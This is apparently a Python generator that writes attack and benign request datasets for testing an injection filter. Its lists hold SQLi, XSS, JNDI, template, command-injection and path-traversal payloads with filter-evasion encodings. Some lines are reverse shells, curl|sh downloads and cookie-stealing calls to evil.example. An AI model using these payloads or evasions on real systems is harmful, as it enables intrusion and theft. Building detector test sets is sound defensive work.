"""공격 셋·정상 셋 1차본 생성기 (결정적, seed 고정).

공격 기본 페이로드는 PayloadsAllTheThings(MIT)·OWASP XSS Filter Evasion Cheat Sheet 유형을 참고해 직접 작성했다.
"""
from __future__ import annotations

import json
import random
import sys
from pathlib import Path
from urllib.parse import quote

SQLI = [
    "admin' OR 1=1--",
    "admin' OR '1'='1",
    "' OR 'a'='a' --",
    "' or true--",
    "1' or '1'='1' /*",
    "admin'--",
    "admin' #",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1 --",
    "\" OR \"\"=\"",
    "1 OR 1=1",
    "1 AND 1=2",
    "5 or 2>1",
    "' UNION SELECT username, password FROM users--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "-1' UNION SELECT 1,@@version,3#",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "1' ORDER BY 3--",
    "1' GROUP BY 2#",
    "'; DROP TABLE users;--",
    "1; DELETE FROM orders",
    "'; INSERT INTO admins VALUES ('x','y');--",
    "1; UPDATE users SET role='admin' WHERE id=1",
    "'; EXEC xp_cmdshell 'whoami';--",
    "1 AND SLEEP(5)",
    "1' AND SLEEP(5) AND '1'='1",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND BENCHMARK(5000000,MD5(1))",
    "1' AND pg_sleep(5)--",
    "1 AND extractvalue(1,concat(0x7e,(SELECT version())))",
    "1 AND updatexml(1,concat(0x7e,database()),1)",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "1 OR EXISTS(SELECT * FROM users)",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/s.php'--",
    "1 UNION SELECT name FROM sqlite_master",
    "' OR username LIKE '%admin%",
    "admin' AND 1=1 AND 'a'='a",
    "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
    "' || '1'='1",
    "1 AND 0x61646d696e3d61646d696e",
    "') UNION SELECT group_concat(password) FROM users--",
    "1 AND CHAR(97,100,109,105,110)='admin'",
]

XSS = [
    "<script>alert(1)</script>",
    "<script src=//evil.example/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert('xss')>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:alert(document.cookie)\">click</a>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=prompt(1)>",
    "\" onmouseover=\"alert(1)",
    "' autofocus onfocus='alert(1)",
    "<details open ontoggle=confirm(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"alert(1)\">",
    "<marquee onstart=alert(1)>",
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<math><mtext><a href=\"javascript:alert(1)\">x</a>",
    "<div style=\"width:expression(alert(1))\">",
    "{{constructor.constructor('alert(1)')()}}",
    "<img src=x onerror=\"fetch('//evil.example/?c='+document.cookie)\">",
    "<script>new Image().src='//evil.example/?'+document.cookie</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>document.write('<img src=//evil.example/'+document.cookie+'>')</script>",
    "javascript:alert(1)",
    "<base href=\"//evil.example/\">",
    "<embed src=\"data:image/svg+xml;base64,PHN2Zz4=\">",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<a href=\"vbscript:msgbox(1)\">x</a>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<img src=1 onerror=alert`1`>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<style>@import'//evil.example/x.css';</style><img src=x onerror=alert(1)>",
]

SCRIPT = [
    "${jndi:ldap://evil.example/a}",
    "${${lower:j}ndi:${lower:l}dap://evil.example/a}",
    "<?php system($_GET['cmd']); ?>",
    "<?= shell_exec($_GET['c']) ?>",
    "eval(base64_decode('ZWNobyAxOw=='));",
    "assert($_POST['x']);",
    "require('child_process').exec('id')",
    "process.mainModule.require('child_process').execSync('id')",
    "Runtime.getRuntime().exec(\"id\")",
    "{{7*7}}",
    "${7*7}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29",
    "eval(unescape('%61%6c%65%72%74%28%31%29'))",
    "fetch('//evil.example/?d='+localStorage.getItem('token'))",
    "navigator.sendBeacon('//evil.example', document.cookie)",
]

SQLI += [
    "' OR 1=1#",
    "1' OR '1'='1'--",
    "admin' OR 'x'='x",
    "' OR ''='",
    "1) OR (1=1",
    "' AND 1=0 UNION SELECT 1,2,3--",
    "1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "1 UNION SELECT username||':'||password FROM users",
    "1' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a",
    "1' AND IF(1=1,SLEEP(5),0)--",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)",
    "'; SELECT pg_sleep(5)--",
    "1;WAITFOR DELAY '0:0:5'--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "1 AND 1=CAST((SELECT version()) AS int)",
    "'; DECLARE @q varchar(99); SET @q='x'; EXEC(@q)--",
    "'; CREATE USER hacker IDENTIFIED BY 'pw';--",
    "1; TRUNCATE TABLE logs",
    "1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
    "admin')--",
    "' OR 'a' LIKE 'a",
    "1 OR 'abc'='abc'",
    "x' AND email IS NULL; --",
    "1 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))",
    "' UNION SELECT @@datadir--",
    "1 AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>64",
]
XSS += [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
    "<svg><script>alert(1)</script></svg>",
    "<img/src/onerror=alert(1)>",
    "<iframe onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<img src=x onerror=window['al'+'ert'](1)>",
    "<img src=x onerror=top[8680439..toString(30)](1)>",
    "\"><svg onload=alert(1)>",
    "'-alert(1)-'",
    "</script><script>alert(1)</script>",
    "<script>fetch('//evil.example/'+document.cookie)</script>",
    "<link rel=import href=//evil.example/x.html>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
    "<x onclick=alert(1)>click</x>",
    "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
    "{{$on.constructor('alert(1)')()}}",
]
SCRIPT += [
    "${jndi:rmi://evil.example:1099/a}",
    "${jndi:dns://evil.example/a}",
    "<?php eval($_POST['x']); ?>",
    "<?php passthru($_REQUEST['cmd']); ?>",
    "system($_GET['c'])",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "#{7*7}",
    "new java.lang.ProcessBuilder(\"id\").start()",
    "eval(gzinflate(base64_decode('...')))",
    "document.location='//evil.example/?c='+document.cookie",
    "\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029",
    "require(\"child_process\").spawn(\"sh\")",
]

FULLWIDTH = {c: chr(ord(c) + 0xFEE0) for c in "<>'\"();=/"}


def v_raw(p):
    return p


def v_url(p):
    return quote(p, safe="")


def v_double_url(p):
    return quote(quote(p, safe=""), safe="")


def v_mixed_case(p):
    rnd = random.Random(p)
    out = []
    for i, c in enumerate(p):
        if i and p[i - 1] == "\\":
            out.append(c)
        else:
            out.append(c.upper() if c.isalpha() and rnd.random() < 0.5 else c.lower())
    return "".join(out)


def v_comment(p):
    return p.replace(" ", "/**/")


def v_fullwidth(p):
    return "".join(FULLWIDTH.get(c, c) for c in p)


def v_entity(p):
    table = {"<": "&lt;", ">": "&gt;", "'": "&#39;", "\"": "&quot;", "(": "&#x28;", ")": "&#x29;"}
    return "".join(table.get(c, c) for c in p)


def v_plus(p):
    return quote(p, safe="").replace("%20", "+")


def v_tab(p):
    return p.replace(" ", "\t")


def v_newline(p):
    return p.replace(" ", "\n")


def v_unicode_u(p):
    return "".join(f"%u{ord(c):04x}" if c in "<>'\"()=;" else "%2B" if c == "+" else c for c in p)


def v_url_mixed(p):
    return quote(v_mixed_case(p), safe="")


def v_double_url_mixed(p):
    return v_double_url(v_mixed_case(p))


def v_comment_mixed(p):
    return v_mixed_case(v_comment(p))


def v_entity_dec(p):
    return "".join(f"&#{ord(c)};" if c in "<>'\"()" else c for c in p)


def v_entity_hex_nosemi(p):
    out = []
    for i, c in enumerate(p):
        if c in "<>'\"":
            nxt = p[i + 1] if i + 1 < len(p) else ""
            out.append(f"&#x{ord(c):x}" + (";" if nxt in "0123456789abcdefABCDEF;" and nxt else ""))
        else:
            out.append(c)
    return "".join(out)


def v_fullwidth_url(p):
    return quote(v_fullwidth(p), safe="")


def v_slash_space(p):
    return p.replace(" ", "/")


def v_versioned_comment(p):
    out = []
    for w in p.split(" "):
        out.append(f"/*!50000{w}*/" if w.upper() in ("UNION", "SELECT", "AND", "OR", "FROM") else w)
    return " ".join(out)


# OS 명령어 삽입: PayloadsAllTheThings "Command Injection"(MIT) 유형을 참고해 직접 작성.
COMMAND = [
    "; cat /etc/passwd",
    "| id",
    "&& whoami",
    "`id`",
    "$(whoami)",
    "; ls -la /",
    "|| uname -a",
    "; sleep 5",
    "& ping -c 10 127.0.0.1 &",
    "127.0.0.1; nc -e /bin/sh evil.example 4444",
    "; bash -i >& /dev/tcp/evil.example/4444 0>&1",
    "; curl http://evil.example/x.sh | sh",
    "| wget -qO- http://evil.example/x | bash",
    ";cat${IFS}/etc/passwd",
    "|cat$IFS$9/etc/shadow",
    "& type C:\\Windows\\win.ini",
    "| powershell -enc SQBFAFgA",
    "& net user",
    "\nid",
    "127.0.0.1\nwhoami",
    "$(curl evil.example/$(whoami))",
    "; python3 -c 'import os;os.system(\"id\")'",
    "a;rm -rf /tmp/x",
    "| nslookup evil.example",
    "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php",
    "& cmd /c whoami",
    "`sleep 10`",
    "; env",
]

# 경로 조작·파일 포함: PayloadsAllTheThings "Directory Traversal"·"File Inclusion"(MIT) 유형을 참고해 직접 작성.
PATHS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "../../../../../../etc/hosts",
    "..//..//..//etc/passwd",
    "../../WEB-INF/web.xml",
    "../../../.env",
    "../../../../root/.ssh/id_rsa",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "zip://uploads/a.zip#shell.php",
    "phar://uploads/a.jpg/shell",
    "expect://id",
    "../../../../etc/passwd\x00.png",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/var/log/apache2/access.log",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "../../../../../boot.ini",
    "/proc/self/cmdline",
    "php://input",
]

SQLI_VARIANTS = {
    "raw": v_raw, "url": v_url, "double-url": v_double_url, "mixed-case": v_mixed_case,
    "comment": v_comment, "plus": v_plus, "fullwidth": v_fullwidth,
    "tab": v_tab, "newline": v_newline, "unicode-u": v_unicode_u, "url+mixed": v_url_mixed,
    "double-url+mixed": v_double_url_mixed, "comment+mixed": v_comment_mixed,
    "versioned-comment": v_versioned_comment, "fullwidth+url": v_fullwidth_url,
}
XSS_VARIANTS = {
    "raw": v_raw, "url": v_url, "double-url": v_double_url, "mixed-case": v_mixed_case,
    "entity": v_entity, "fullwidth": v_fullwidth,
    "entity-dec": v_entity_dec, "entity-hex-nosemi": v_entity_hex_nosemi, "unicode-u": v_unicode_u,
    "url+mixed": v_url_mixed, "double-url+mixed": v_double_url_mixed, "fullwidth+url": v_fullwidth_url,
    "slash-space": v_slash_space, "newline": v_newline,
}
CMD_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url, "tab": v_tab,
                "unicode-u": v_unicode_u, "plus": v_plus}
PATH_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url}
SCR_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url, "mixed-case": v_mixed_case,
                "url+mixed": v_url_mixed, "unicode-u": v_unicode_u, "double-url+mixed": v_double_url_mixed}

TARGETS = {
    "SQLI": [("/api/login", "username", "query"), ("/api/products", "id", "query"),
             ("/api/users/search", "name", "form")],
    "XSS": [("/api/qna/posts", "content", "json"), ("/api/search", "q", "query"),
            ("/api/profile", "bio", "form")],
    "SCR": [("/api/feedback", "message", "json"), ("/", "user-agent", "header"),
            ("/api/search", "q", "query")],
    "CMD": [("/api/tools/ping", "host", "query"), ("/api/feedback", "message", "json"),
            ("/api/files", "name", "form")],
    "PATH": [("/api/download", "file", "query"), ("/api/files", "name", "form"),
             ("/api/report", "template", "json")],
}


def build_attacks() -> list[dict]:
    rows = []
    for cat, bases, variants in (
        ("SQLI", SQLI, SQLI_VARIANTS), ("XSS", XSS, XSS_VARIANTS), ("SCR", SCRIPT, SCR_VARIANTS),
        ("CMD", COMMAND, CMD_VARIANTS), ("PATH", PATHS, PATH_VARIANTS),
    ):
        for i, base in enumerate(bases):
            for j, (vname, fn) in enumerate(variants.items()):
                path, param, loc = TARGETS[cat][(i + j) % len(TARGETS[cat])]
                payload = fn(base)
                if loc in ("query", "form"):
                    # 쿼리·폼 값은 전송 형식상 반드시 인코딩된다(& # 공백이 그대로면 값이 잘려 공격이 성립하지 않는다).
                    if vname == "unicode-u":
                        payload = quote(payload, safe="%")
                    elif "url" not in vname and vname != "plus":
                        payload = quote(payload, safe="")
                if vname == "plus" and loc not in ("query", "form"):
                    continue
                if vname.startswith("fullwidth") and "&#" in base:
                    continue
                if cat == "SCR" and vname in ("mixed-case", "url+mixed", "double-url+mixed") and base.startswith("\\x"):
                    continue
                if cat == "CMD" and vname in ("tab", "plus") and " " not in base:
                    continue
                if cat == "CMD" and vname == "unicode-u" and v_unicode_u(base) == base:
                    continue
                rows.append({"category": cat, "path": path, "param": param, "location": loc,
                             "variant": vname, "payload": payload, "base": base})
    return rows


NORMAL_TEXT = [
    "안녕하세요. 이번 주 스터디 일정 공유드립니다.",
    "O'Brien",
    "D'Angelo",
    "Shaquille O'Neal",
    "It's a beautiful day, isn't it?",
    "I said 'hi' and he is nice",
    "Rock 'n' roll",
    "What's the difference between 'select' and 'option' tags?",
    "SQL에서 JOIN과 서브쿼리 중 뭐가 빠른가요?",
    "MySQL 8 설치 후 접속이 안 됩니다. 에러 코드 1045 나와요.",
    "인덱스를 걸었는데 order by가 느려요",
    "select 박스 스타일을 바꾸고 싶어요",
    "Please select one of the options below and update your profile.",
    "Drop me a line when you're free; update me later.",
    "주문 취소하고 싶어요 -- 급합니다",
    "가격은 1,000원 ~ 5,000원 사이",
    "50% 할인 쿠폰 + 무료 배송",
    "a+b=c 를 증명하세요",
    "if (a < b && c > d) return;",
    "for (int i = 0; i < n; i++) { sum += arr[i]; }",
    "print('hello world')",
    "console.log(`value: ${value}`);",
    "const sleep = ms => new Promise(r => setTimeout(r, ms));",
    "time.sleep(1) 대신 asyncio.sleep을 써야 하나요?",
    "def add(a, b): return a + b",
    "React에서 onClick 이벤트가 두 번 호출돼요",
    "<b>굵게</b> 표시가 안 돼요",
    "<p>첫 문단</p><p>둘째 문단</p>",
    "C# 과 Java 중 무엇을 배울까요?",
    "#해시태그 #일상 #맛집",
    "이메일: user.name+tag@example.com",
    "https://example.com/search?q=%EA%B2%80%EC%83%89&page=2",
    "전화번호 010-1234-5678",
    "1 or 2 people are coming",
    "Tom and Jerry",
    "black or white, union of sets A and B",
    "The union representatives will select a new leader from the members.",
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
    "rm -rf node_modules 하고 다시 설치했어요",
    "JSON 예시: {\"name\": \"kim\", \"age\": 20}",
    "할인율 = (정가 - 판매가) / 정가 * 100",
    "x >= 10 and y <= 20 조건을 만족하는 값",
    "뭔가 잘못됐어요 ;; 도와주세요",
    "I'm \"really\" happy :)",
    "Q&A 게시판 & 공지사항",
    "Tom & Jerry's adventure",
    "&nbsp; 가 화면에 그대로 보여요",
    "2024년 1월 1일 ~ 2024년 12월 31일",
    "에러: Uncaught TypeError: Cannot read properties of undefined",
    "SELECT 문 기초 강의 들으려면 어디로 가나요?",
    "엑셀에서 =SUM(A1:A10) 결과가 이상해요",
    "다음 주 화요일 3시 회의 (회의실 B)",
    "배송지: 서울시 강남구 테헤란로 123, 4층",
    "user_id=42&sort=desc",
    "{{ user.name }}님 환영합니다 (템플릿 문법 질문)",
    "Vue에서 {{ message }} 가 렌더링이 안 돼요",
    "AND/OR 연산 우선순위가 헷갈려요",
    "The script for the play was written in 1999.",
    "I love JavaScript: the good parts",
    "background-color: #ffffff; font-size: 14px;",
    "평점 5/5 ★★★★★ 강추!",
    "N'Djamena is the capital of Chad",
    "Let's meet at 7 o'clock",
    "\"quoted\" and 'single' marks",
    "regex: ^[a-z0-9_]{3,16}$",
    "git commit -m \"fix: typo\"",
    "SVG 아이콘을 쓸 때 width와 height를 어떻게 주나요?",
    "img 태그 alt 속성은 꼭 필요한가요?",
    "document 객체에 대해 설명해주세요",
    "eval 함수는 왜 위험한가요?",
    "1=1 이 항상 참인 이유",
    "<br> 태그 대신 CSS로 줄바꿈 하는 방법",
    "Copyright © 2026 Example Corp.",
    "Ｈｅｌｌｏ 전각 문자 예시",
    "（주）예시상사",
    "가격：１０，０００원",
    "카페라떼 (ICE) 2잔, 아메리카노 1잔",
    "마감 D-3!!",
    "@channel 오늘 배포 있습니다",
    "100% 환불 보장",
    "PHP <?php echo 쓰는 법?",
]



TOPICS = ["노트북", "무선 이어폰", "키보드", "모니터", "운동화", "백팩", "커피머신", "에어프라이어", "책상", "의자",
          "스마트워치", "블루투스 스피커", "전기자전거", "캠핑 의자", "텀블러"]
ADJ = ["가볍고", "튼튼하고", "조용하고", "가성비 좋고", "디자인이 예쁘고", "배터리가 오래가고", "배송이 빠르고"]
VERDICT = ["만족합니다", "재구매 의사 있어요", "추천합니다", "그냥 그래요", "조금 아쉬워요", "별로였어요"]
LANGS = ["Python", "Java", "JavaScript", "TypeScript", "Go", "Rust", "C++", "Kotlin", "Swift", "PHP", "C#"]
TASKS = ["파일 읽기", "정렬", "날짜 변환", "HTTP 요청", "JSON 파싱", "멀티스레드", "예외 처리", "테스트 작성",
         "로그 남기기", "환경 변수 읽기", "문자열 자르기", "정규식 매칭"]
ERRORS = ["NullPointerException", "TypeError: undefined is not a function", "Segmentation fault",
          "ModuleNotFoundError: No module named 'requests'", "CORS policy 오류", "403 Forbidden", "timeout",
          "permission denied", "ECONNREFUSED 127.0.0.1:5432", "OutOfMemoryError"]
PLACES = ["서울시 강남구 테헤란로 152", "부산시 해운대구 센텀중앙로 79", "대전시 유성구 대학로 99",
          "경기도 성남시 분당구 판교역로 235", "인천시 연수구 송도과학로 32"]
FOREIGN = ["O'Brien", "D'Souza", "O'Connor", "Mary-Jane Watson", "Jean-Luc Picard", "Zoë Saldaña", "José Álvarez",
           "N'Golo Kanté", "Renée O'Hara", "Anne-Marie", "François Hollande", "Chloë Grace", "Ma'ayan"]
KR_NAMES = ["김민수", "이서연", "박지훈", "최유진", "정하늘", "강다은", "윤도현", "장미란", "한지민", "오세훈", "서지수"]
CODE = [
    "for i in range(10):\n    print(i)",
    "const xs = items.filter(x => x.price > 1000).map(x => x.name);",
    "if (user != null && user.isActive()) { return user.getName(); }",
    "SELECT_COLUMNS = ['id', 'name']  # 설정값",
    "df.groupby('category')['price'].mean()",
    "git rebase -i HEAD~3",
    "docker compose up -d --build",
    "kubectl get pods -n prod",
    "npm install --save-dev typescript",
    "pip install -r requirements.txt",
    "#include <vector>\nstd::vector<int> v{1, 2, 3};",
    "fn main() { println!(\"hello\"); }",
    "let total = prices.reduce((a, b) => a + b, 0);",
    "public static void main(String[] args) { }",
    "with open('a.txt', encoding='utf-8') as f: data = f.read()",
    "curl -X POST -H 'Content-Type: application/json' https://api.example.com/v1/items",
    ".btn { color: #fff; background: #2f5bd3; }",
    "@media (max-width: 600px) { .grid { display: block; } }",
    "<p>문단입니다.</p>",
    "<b>굵게</b>와 <i>기울임</i>",
    "<ul><li>하나</li><li>둘</li></ul>",
    "<br>",
    "<table><tr><td>1</td></tr></table>",
    "**굵게** _기울임_ `코드` [링크](https://example.com)",
    "# 제목\n- 항목 1\n- 항목 2",
    "{\"page\": 1, \"size\": 20, \"sort\": \"desc\"}",
    "x = a if a > b else b",
    "ls -al | grep log",
    "echo $HOME",
    "a[i] = a[i-1] + a[i-2]",
]
QUESTIONS = [
    "{lang}로 {task} 하는 방법 알려주세요",
    "{lang}에서 {err} 에러가 나요. 어떻게 해결하나요?",
    "{lang} {task} 예제 코드가 이상해요:\n{code}",
    "{task} 성능이 느린데 {lang} 말고 다른 방법이 있을까요?",
    "이 코드 리뷰 부탁드려요\n{code}",
    "{err} 가 계속 떠서 서버가 재시작돼요",
]
REVIEWS = [
    "{topic} 샀는데 {adj} {verdict}",
    "{topic} 2주 사용 후기: {adj} {verdict}. 배송은 3일 걸렸어요.",
    "{name}님이 추천해서 {topic} 구매했어요. {verdict}!",
    "{topic} 색상 문의드립니다. 블랙/화이트 중 재고 있나요?",
    "{topic} 교환하고 싶어요 (주문번호 2026-{num})",
    "별점 {star}/5 — {topic} {verdict}",
]
CHAT = [
    "오늘 회의 {h}시로 변경됐습니다",
    "{name}님, 자료 공유 부탁드려요 :)",
    "점심 뭐 먹을까요? 김치찌개 or 돈가스",
    "내일 비 온대요 ㅠㅠ 우산 챙기세요",
    "택배 {place}로 보내주세요",
    "문의: {email} 로 연락 주세요",
    "연락처 010-{a}-{b}",
    "{num}원 입금 완료했습니다!",
    "링크: https://example.com/board/{num}?ref=home&utm_source=mail",
    "\"인용문\"이라고 쓰면 따옴표가 깨져요",
    "It's 'fine' -- don't worry",
    "Let's meet at {h} o'clock & discuss the plan",
    "Q: 환불 가능한가요? A: 7일 이내 가능합니다.",
    "1) 회원가입 2) 로그인 3) 결제",
    "100% 정품 / 무료배송 / 당일발송",
    "[공지] 서버 점검 {h}:00 ~ {h2}:00",
]
SEARCH = ["노트북", "무선 이어폰", "c++ 책", "select box css", "union station", "drop shipping", "or 연산자",
          "아이폰 15 케이스", "운동화 270mm", "\"정확한 문구\" 검색", "50% sale", "tom & jerry", "script writing",
          "order by 뜻", "alert 소리 끄기", "on-off 스위치", "insert 키 고장", "delete 계정", "update 오류",
          "어린이 날 선물", "제주도 3박 4일", "가을 코트", "python for beginners", "where to buy", "select all 단축키"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 15; SM-S928N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Mobile Safari/537.36",
    "curl/8.10.1", "python-httpx/0.28.1", "PostmanRuntime/7.43.0", "okhttp/4.12.0",
]


SHELL_TEXT = [
    "ls -al 결과에서 숨김 파일만 보고 싶어요",
    "cat 명령으로 /etc/nginx/nginx.conf 내용을 보면 server 블록이 두 개예요",
    "cd ../../ 하면 어디로 이동하나요?",
    "import Button from '../../components/Button' 경로가 자꾸 틀렸다고 나와요",
    "git log --oneline | head -5 로 최근 커밋만 봅니다",
    "윈도우에서 C:\\Users\\me\\Documents 폴더가 안 열려요",
    "docker run -it ubuntu bash 했더니 permission denied",
    "chmod 755 deploy.sh 후에도 실행이 안 됩니다",
    "rm -rf node_modules 하고 다시 npm install 했어요",
    "echo $HOME 이 비어 있는 이유가 뭘까요",
    "ping 은 되는데 curl 은 타임아웃이 나요",
    "python3 -m venv .venv 로 가상환경을 만들었어요",
    "로그는 /var/www/app/storage/logs 에 쌓입니다",
    "grep -r TODO src | wc -l 로 개수를 셌어요",
    "sudo systemctl restart nginx 하면 502가 사라져요",
    "환경 변수는 .env.example 을 복사해서 쓰세요",
    "find . -name '*.log' -mtime +7 -delete 가 위험한가요?",
    "tar -czf backup.tar.gz ./data 로 백업했습니다",
    "ssh-keygen 으로 만든 키를 서버에 등록하는 방법",
    "PowerShell 에서 Get-ChildItem 결과를 정렬하려면?",
]
FILE_NAMES = [
    "report_2026.pdf", "2026/11/invoice-123.pdf", "images/logo.png", "docs/guide.md", "my file (1).txt",
    "사진_2026-11-27.jpg", "backup.tar.gz", "data.v2.csv", "templates/email/welcome.html", "README",
    "a.b.c.d.txt", "assets/fonts/NotoSans-Regular.woff2", "export (final) v3.xlsx", "notes..txt",
]
HOSTS = ["127.0.0.1", "8.8.8.8", "example.com", "api.example.co.kr", "10.0.0.12", "2001:db8::1",
         "my-server.local", "192.168.0.1"]
SEARCH_CMD_WORDS = ["cat food", "id card", "ping pong", "sleep mask", "echo dot", "curl 헤어", "rm 뜻",
                    "whoami 명령어", "tom & jerry", "salt & pepper", "a|b 테스트", "black;white"]


def build_normals(target: int = 1000, seed: int = 20261125) -> list[dict]:
    rnd = random.Random(seed)
    rows: list[dict] = []

    def add(path, param, loc, payload, variant):
        if loc in ("query", "form"):
            payload = quote(payload, safe="").replace("%20", "+")
        rows.append({"path": path, "param": param, "location": loc, "payload": payload, "variant": variant})

    for t in NORMAL_TEXT:
        add("/api/qna/posts", "content", "json", t, "handwritten")
    for n in FOREIGN + KR_NAMES:
        add("/api/users/search", "name", "form", n, "name")
        add("/api/profile", "display_name", "json", n, "name")
    for q in SEARCH:
        add("/api/search", "q", "query", q, "search")
    for ua in UAS:
        add("/", "user-agent", "header", ua, "user-agent")
    for c in CODE:
        add("/api/qna/posts", "content", "json", c, "code")

    def fill(tpl: str) -> str:
        return tpl.format(
            lang=rnd.choice(LANGS), task=rnd.choice(TASKS), err=rnd.choice(ERRORS), code=rnd.choice(CODE),
            topic=rnd.choice(TOPICS), adj=rnd.choice(ADJ), verdict=rnd.choice(VERDICT),
            name=rnd.choice(KR_NAMES + FOREIGN), num=rnd.randint(1000, 99999), star=rnd.randint(1, 5),
            h=rnd.randint(9, 18), h2=rnd.randint(19, 23), place=rnd.choice(PLACES),
            email=f"user{rnd.randint(1, 999)}@example.com", a=rnd.randint(1000, 9999), b=rnd.randint(1000, 9999))

    kinds = [("question", QUESTIONS, "/api/qna/posts", "content", "json"),
             ("review", REVIEWS, "/api/qna/posts", "content", "json"),
             ("chat", CHAT, "/api/feedback", "message", "json"),
             ("bio", REVIEWS + CHAT, "/api/profile", "bio", "form")]
    i = 0
    while len(rows) < target:
        variant, tpls, path, param, loc = kinds[i % len(kinds)]
        text = fill(rnd.choice(tpls))
        if rnd.random() < 0.25:
            text += "\n" + fill(rnd.choice(tpls))
        add(path, param, loc, text, variant)
        i += 1
    # CMD·PATH 분류를 추가하며 늘린 정상 셋. 앞의 1,000건이 바뀌지 않도록 무작위 채우기 뒤에 붙인다.
    for t in SHELL_TEXT:
        add("/api/qna/posts", "content", "json", t, "shell-question")
    for f in FILE_NAMES:
        add("/api/download", "file", "query", f, "file-name")
        add("/api/files", "name", "form", f, "file-name")
    for h in HOSTS:
        add("/api/tools/ping", "host", "query", h, "host")
    for q in SEARCH_CMD_WORDS:
        add("/api/search", "q", "query", q, "search")
    return rows


def write_jsonl(path: Path, rows: list[dict]) -> None:
    with path.open("w", encoding="utf-8", newline="\n") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")


def main() -> None:
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "datasets")
    out.mkdir(parents=True, exist_ok=True)
    attacks = build_attacks()
    normals = build_normals()
    write_jsonl(out / "attack.jsonl", attacks)
    write_jsonl(out / "normal.jsonl", normals)
    print(f"attack={len(attacks)} normal={len(normals)}")


if __name__ == "__main__":
    main()
